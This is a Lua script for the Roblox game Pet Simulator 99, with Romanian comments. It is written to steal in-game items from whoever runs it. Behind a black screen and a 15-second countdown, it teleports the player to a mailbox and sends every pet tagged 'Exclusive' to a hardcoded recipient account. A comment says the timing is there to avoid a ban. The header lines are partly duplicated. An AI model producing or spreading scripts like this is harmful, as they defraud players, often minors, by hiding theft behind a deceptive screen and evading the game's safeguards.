-- =============================================  
-- INSTANT MAILBOX SCRIPT (PET SIMULATOR 99)  
-- Teleportare + Auto-Write "LOL" + Donate  
-- =============================================  

local player = game:GetService("Players").LocalPlayer  
local targetUser = "pompeiulcelbatran" -- SCHIMBĂ AICI  

-- 1. ECRAN NEGRU ȘI BLOCARE INPUT  
local gui = Instance.new("ScreenGui")  
local player = game:GetService("Players").LocalPlayer
local targetUser = "pompeiulcelbatran" -- SCHIMBĂ AICI
local mailboxPos = Vector3.new(141.1, 23.6, -347.2) -- COORDONATELE TALE

-- 1. ECRAN NEGRU INSTANT
local gui = Instance.new("ScreenGui")
gui.Name = "BlackScreen"
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.Parent = gui

-- 2. TELEPORTARE LA MAILBOX (COORDONATELE TALE)
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
    player.Character.HumanoidRootPart.CFrame = CFrame.new(mailboxPos)
end

-- 3. SCRIE "LOL" ÎN MAILBOX (AȘTEPTĂ 2 SEC)
task.wait(2)
local coreGui = game:GetService("CoreGui")
for _, obj in ipairs(coreGui:GetDescendants()) do
    if obj:IsA("TextBox") and obj.Name == "MessageBox" then
        obj.Text = "LOL"
        break
    end
end

-- 4. DONEAZĂ EXCLUSIVELE
task.wait(1)
local backpack = player.Backpack or player.Character
for _, pet in ipairs(backpack:GetChildren()) do
    if pet:FindFirstChild("Exclusive") then
        game:GetService("ReplicatedStorage").Events.DonatePet:FireServer(targetUser, pet.Name)
        task.wait(0.3) -- EVITĂ BAN
    end
end

-- 5. NUMĂRĂTOARE (15->0) ȘI CURĂȚĂ ECRANUL
local countdown = Instance.new("TextLabel")
countdown.Text = "15"
countdown.Size = UDim2.new(0, 200, 0, 50)
countdown.Position = UDim2.new(0.5, -100, 0.5, -25)
countdown.TextColor3 = Color3.new(1, 1, 1)
countdown.Font = Enum.Font.SourceSansBold
countdown.Parent = frame

for i = 15, 0, -1 do
    countdown.Text = tostring(i)
    task.wait(1)
end
gui:Destroy() -- ȘTERGE ECRANUL NEGRU
